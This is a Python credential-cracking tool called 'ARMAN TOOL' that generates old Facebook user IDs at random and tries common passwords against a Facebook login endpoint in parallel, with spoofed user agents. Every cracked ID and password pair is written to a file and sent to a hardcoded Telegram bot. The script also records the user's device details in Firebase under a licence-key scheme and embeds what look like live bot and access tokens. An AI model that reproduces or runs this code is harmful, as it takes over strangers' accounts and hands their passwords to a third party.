# -*- coding: utf-8 -*-

import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import platform
import warnings
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime, timedelta

warnings.filterwarnings("ignore", category=SyntaxWarning)

modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module} > /dev/null 2>&1')

import requests
from requests.exceptions import ConnectionError

requests.urllib3.disable_warnings()

FIREBASE_URL = "https://arman-f9a3b-default-rtdb.firebaseio.com/"

BOT_TOKEN = "8974282237:AAEov6IiXxLPOJT6-yN3GLTmRE643-O-6DY"
TELEGRAM_USER = "8568795915"

def check_update():
    try:
        url = "https://arman-f9a3b-default-rtdb.firebaseio.com/123/Version.json"
        response = requests.get(url, timeout=5)
        server_version = response.json()
        
        current_version = "15.3"
        
        if server_version and str(server_version).strip() != str(current_version).strip():
            print("\n\x1b[38;5;196m========================================\033[0m")
            print("\x1b[38;5;226m [!] New Version Available on Server!\033[0m")
            print(f"\x1b[38;5;46m [✓] Updating Tool to Version: {server_version}\033[0m")
            print("\x1b[38;5;51m [i] Please wait, downloading latest code...\033[0m")
            print("\x1b[38;5;196m========================================\033[0m")
            
            os.system('git pull origin main > /dev/null 2>&1 || git pull > /dev/null 2>&1')
            print("\n\x1b[38;5;46m[✓] Tool Updated Successfully! Restarting...\033[0m")
            time.sleep(2)
            os.execv(sys.executable, ['python'] + sys.argv)
    except Exception:
        pass

def get_device_model():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip().capitalize()
        model = os.popen("getprop ro.product.model").read().strip()
        if brand and model:
            if brand.lower() in model.lower():
                return model
            return f"{brand} {model}"
        elif model:
            return model
        elif brand:
            return brand
    except Exception:
        pass
    return "Unknown Device"

def get_android_version():
    try:
        return os.popen("getprop ro.build.version.release").read().strip() or "Unknown"
    except Exception:
        return "Unknown"

def get_hwid():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip()
        model = os.popen("getprop ro.product.model").read().strip()
        device = os.popen("getprop ro.product.device").read().strip()
        if brand or model or device:
            combined = f"{brand}_{model}_{device}"
            if len(combined.strip("_")) > 2:
                return combined
    except Exception:
        pass
    try:
        android_id = os.popen("settings get secure android_id").read().strip()
        if android_id and android_id != "null":
            return f"AND_ID_{android_id}"
    except Exception:
        pass
    try:
        return platform.node() + "_" + platform.machine()
    except Exception:
        return "ARMAN_DEVICE_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def record_user_daily_usage(user_key):
    try:
        today_date = datetime.now().strftime("%Y-%m-%d")
        usage_path = f"{FIREBASE_URL}keys/{user_key}/daily_usage/{today_date}.json"
        res = requests.get(usage_path, timeout=3)
        current_count = res.json()
        if current_count and isinstance(current_count, int):
            new_count = current_count + 1
        else:
            new_count = 1
        requests.put(usage_path, json=new_count, timeout=3)
    except Exception:
        pass

def send_login_alert(user_key, user_name, expiry_date):
    device_name = get_device_model()
    android_ver = get_android_version()
    message = (
        "🔥 NEW USER / TRIAL ACTIVATED!\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 Customer Name: {user_name}\n"
        f"🔑 Key / Trial Code: {user_key}\n"
        f"📱 Device Model: {device_name}\n"
        f"🤖 Android Ver: {android_ver}\n"
        f"⏰ Expiry Date: {expiry_date}\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_USER, "text": message}
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception:
        pass

def send_clone_alert(uid, pw, status):
    emoji = "🟩"
    message = (
        f"{emoji} NEW {status} ID FOUND!\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 UID: {uid}\n"
        f"🔑 Password: {pw}\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_USER, "text": message}
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception:
        pass

def calculate_time_left(expiry_str):
    if not expiry_str:
        return expiry_str
    try:
        try:
            exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
        except Exception:
            exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d")
        now = datetime.now()
        diff = exp_dt - now
        total_seconds = diff.total_seconds()
        if total_seconds <= 0: 
            return "Expired"
        total_hours = int(total_seconds // 3600)
        minutes = int((total_seconds % 3600) // 60)
        if total_hours < 24:
            return f"{total_hours}h {minutes}m Left"
        else:
            days = total_hours // 24
            rem_hours = total_hours % 24
            return f"{days}d {rem_hours}h {minutes}m Left"
    except Exception:
        return expiry_str

def display_welcome_banner(user_name, user_key, time_left):
    os.system('clear')
    print(f"""
\033[1;36m╔════════════════════════════════════════════╗
║             🔥 ARMAN TOOL 🔥               ║
╠════════════════════════════════════════════╣
║ 🇵🇰 ᴘᴛɪ       : ᴘᴛɪ ᴛɪɢᴇʀ                   ║
║ 👑 ᴋʜᴀɴ ᴅɪᴡᴀɴᴀ: ᴅɪʟ ᴍᴀɪɴ ɪᴍʀᴀɴ ᴋʜᴀɴ         ║
║ ⏳ ᴠᴀʟɪᴅɪᴛʏ  : {time_left:<27} ║
║ ⚡ sʏsᴛᴇᴍ ᴋᴀ ʙᴀᴘ: ɪᴍʀᴀɴ ᴋʜᴀɴ               ║
╚════════════════════════════════════════════╝\033[0m
""")

def hold_screen_10_seconds():
    for i in range(10, 0, -1):
        print(f"\r\033[1;33m[⏳] Starting Tool in {i:02d} seconds...\033[0m", end="", flush=True)
        time.sleep(1)
    print("\n\033[1;32m[✓] Loading Main Menu...\033[0m")
    time.sleep(1)

def check_key():
    check_update()
    try:
        for m_node in ["maintenance.json", "maintenance_mode.json"]:
            m_res = requests.get(f"{FIREBASE_URL}{m_node}", timeout=5)
            m_status = m_res.json()
            if m_status in ("ON", True, "True", 1, "1"):
                os.system('clear')
                print("\n\033[1;31m[!] SYSTEM IS UNDER MAINTENANCE / BLOCKED BY ADMIN!\033[0m")
                print("\033[1;33m[!] Please try again later.\033[0m\n")
                sys.exit()
    except Exception:
        pass

    saved_key_file = "/data/data/com.termux/files/home/.arm_key.txt"
    try:
        if not os.path.exists("/data/data/com.termux"):
            import pathlib
            saved_key_file = os.path.join(str(pathlib.Path.home()), ".arm_key.txt")
    except Exception:
        pass
        
    user_hwid = get_hwid()
    user_key = None
    
    if os.path.exists(saved_key_file):
        try:
            with open(saved_key_file, "r") as f:
                user_key = f.read().strip().upper()
        except Exception:
            user_key = None

    key_data = None
    is_valid = False

    if user_key:
        try:
            res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
            key_data = res.json()
            if key_data and isinstance(key_data, dict):
                expiry_str = key_data.get('expiry')
                saved_hwid = key_data.get('hwid')
                if saved_hwid in ("None", "", None):
                    requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={'hwid': user_hwid})
                    saved_hwid = user_hwid
                now_str = datetime.now().strftime("%Y-%m-%d %H:%M")
                if expiry_str != "Lifetime" and expiry_str < now_str:
                    print("\n\033[1;31m[×] Your Key / Free Trial has Expired! Please buy a Paid Key.\033[0m")
                    if os.path.exists(saved_key_file): os.remove(saved_key_file)
                    user_key = None
                else:
                    if saved_hwid in (user_hwid, "None", "", None):
                        is_valid = True
                    else:
                        if os.path.exists(saved_key_file): 
                            os.remove(saved_key_file)
                        user_key = None
        except Exception:
            pass

    if not is_valid:
        try:
            safe_hwid_node = user_hwid.replace(".", "_").replace("#", "_").replace("$", "_").replace("[", "_").replace("]", "_").replace("/", "_")
            trial_check_res = requests.get(f"{FIREBASE_URL}trial_logs/{safe_hwid_node}.json", timeout=10)
            already_took_trial = trial_check_res.json()
            if already_took_trial is True:
                pass
            else:
                requests.put(f"{FIREBASE_URL}trial_logs/{safe_hwid_node}.json", json=True)
                trial_key = "TRL-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                expiry_date = (datetime.now() + timedelta(days=2)).strftime('%Y-%m-%d %H:%M')
                customer_name = "Auto_Trial_User"
                device_model = get_device_model()
                android_ver = get_android_version()
                payload = {
                    'name': customer_name,
                    'expiry': expiry_date,
                    'hwid': user_hwid,
                    'device_model': device_model,
                    'android_version': android_ver,
                    'app_version': '1.0'
                }
                requests.put(f"{FIREBASE_URL}keys/{trial_key}.json", json=payload)
                send_login_alert(trial_key, customer_name, expiry_date)
                try:
                    with open(saved_key_file, "w") as f: 
                        f.write(trial_key)
                except Exception:
                    pass
                print(f"\n\033[1;32m[✓] NEW USER 2 DAYS FREE APPROVAL 🔥\033[0m")
                time.sleep(2)
                user_key = trial_key
                key_data = payload
                is_valid = True
        except Exception:
            pass

    if not is_valid:
        if os.path.exists(saved_key_file):
            try: os.remove(saved_key_file)
            except Exception: pass
        os.system('clear')
        print("""\033[1;33m
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃               [!] ACCESS DENIED                 ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ YOUR FREE TRIAL HAS ENDED                       ┃
┃ Please contact ARMAN to get your Key!           ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m""")
        customer_name = input("\033[1;33m[?] Enter Your Name: \033[0m").strip().upper()
        if not customer_name: 
            customer_name = "USER"
        user_key = input("\n\033[1;36m[?] Enter Your Key: \033[0m").strip().upper()
        try:
            res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
            key_data = res.json()
            if key_data and isinstance(key_data, dict):
                expiry_str = key_data.get('expiry')
                saved_hwid = key_data.get('hwid')
                if saved_hwid and saved_hwid not in ("None", "") and saved_hwid != user_hwid:
                    print("\n\033[1;31m[×] Key is registered to another device!\033[0m")
                    sys.exit()
                device_model = get_device_model()
                android_ver = get_android_version()
                requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={
                    'hwid': user_hwid, 
                    'name': customer_name,
                    'device_model': device_model,
                    'android_version': android_ver,
                    'app_version': '1.0'
                })
                send_login_alert(user_key, customer_name, expiry_str)
                try:
                    with open(saved_key_file, "w") as f: 
                        f.write(user_key)
                except Exception:
                    pass
                is_valid = True
            else:
                print("\n\033[1;31m[×] Invalid Key! Key not found in database.\033[0m")
                sys.exit()
        except Exception as e:
            print(f"\n\033[1;31m[×] Connection Error: {e}\033[0m")
            sys.exit()

    if is_valid and key_data:
        record_user_daily_usage(user_key)
        return key_data.get("name", "USER"), user_key, key_data.get('expiry')
    return None

method = []
oks = []
loop = 0
user = []

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'

def window1():
    fb_ua_list = [
        "Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.25.115;]",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.037) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/FBIOS;FBAV/425.0.0.12.34;]",
        "Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Pro Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/428.0.0.32.109;]"
    ]
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D] + fb_ua_list)

def get_smart_headers():
    ua = window1()
    return {
        "Host": "b-graph.facebook.com",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "X-Requested-With": "com.facebook.katana",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9"
    }

sys.stdout.write('\x1b]2;{ Arman 👑 }\x07')

def show_branding():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    print(r"""\033[1;32m
      _    ____  ____  __  __    _    _   _ 
     / \  |  _ \|  _ \|  \/  |  / \  | \ | |
    / _ \ | |_) | |_) | |\/| | / _ \ |  \| |
   / ___ \|  _ <|  _ <| |  | |/ ___ \| |\  |
  /_/   \_\_| \_\_| \_\_|  |_/_/   \_\_| \_|
\033[0m""")
               
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mARMAN")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mARMAN-TOOL")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAPP   \x1b[38;5;46m▶  \033[1;97m03022745249")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m15.3")
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

def ____banner____():
    show_branding()

def BNG_71_():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mOLD CLONE')
    linex()
    __Jihad__ = input("       \x1b[38;5;41mCHOICE  " + W + ": " + Y)
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49m2009 series')
    linex()
    _input = input("       \x1b[38;5;41mCHOICE  " + W + ": " + Y)
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()

def old_One():
    user = []
    ____banner____()
    print("       \x1b[38;5;49mOld Code " + Y + ":" + G + " 2010-2014")
    ask = input("       \x1b[38;5;41mSELECT " + Y + ":" + G + " ")
    linex()
    ____banner____()
    print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE " + Y + ":" + G + " 20000 / 30000 / 99999")
    limit = int(input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mLIMIT " + Y + ":" + G + " "))
    linex()
    
    for _ in range(limit):
        code = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(code)
        
    print(f"\x1b[38;5;46m[✓] Total IDs Generated: {len(user)}\033[0m")
    print(f"\x1b[38;5;51m[i] Starting Cracking Process...\033[0m")
    linex()
    
    with tred(max_workers=20) as pool:
        for uid in user:
            pool.submit(api_cracking, uid)

def api_cracking(uid):
    global loop, oks
    sys.stdout.write(f"\r\r\033[1;37m[ARMAN-OLD] \033[1;36m{loop}\033[1;37m | \033[1;32mOK:{len(oks)}\033[0m")
    sys.stdout.flush()
    try:
        MY_TOKEN = "EAATlPU5kUrABSLZClswny9YmYedyXN7Tj8kqTcNUYvlZALoEm1zKWSpZAoOgZBoGZAeDBkvB7235BSF8eH1s5F2ZCMWqQ5qdJTZBw2CyLZBHZAZCZBr95vhTdXc4tQBAPZCiUkapZAexD1x4P0OyqEt0IlA6xCjj0C9F2uR3i78B0wJ7SdZAvBZCZAoxPXugV9dtSas5iBvmy6kkvK4E72KjxlMwmagDgJrlhBwoLmwi"
        passwords = ['123456', '12345678', '123456789', 'pakistan', 'khan123', 'samsung', '786786', '12345', 'baazigar']
        for pw in passwords:
            headers = get_smart_headers()
            url = f"https://graph.facebook.com/auth/login?method=GET&format=json&sdk=ios&sdk_version=2&email=10000{uid}&password={pw}&access_token={MY_TOKEN}"
            
            res = requests.get(url, headers=headers, timeout=15)
            data = res.json()
            
            if "access_token" in data or "uid" in data:
                print(f"\n\033[1;32m[ARMAN-OK] 10000{uid} | {pw}\033[0m")
                oks.append(f"10000{uid}|{pw}")
                with open("arman_ok.txt", "a") as f:
                    f.write(f"10000{uid}|{pw}\n")
                send_clone_alert(f"10000{uid}", pw, "OK")
                break
                
        time.sleep(random.uniform(0.3, 0.9))
        loop += 1
    except Exception:
        loop += 1

def old_Tow():
    print("\n\033[1;33m[!] 100003/4 Series Selected\033[0m")
    old_One()

def old_Tree():
    print("\n\033[1;33m[!] 2009 Series Selected\033[0m")
    old_One()

if __name__ == "__main__":
    try:
        user_name, user_key, expiry_date = check_key()
        time_left = calculate_time_left(expiry_date)
        display_welcome_banner(user_name, user_key, time_left)
        hold_screen_10_seconds()
        BNG_71_()
    except Exception as e:
        print(f"\n\033[1;31m[×] Error: {e}\033[0m")
        sys.exit()

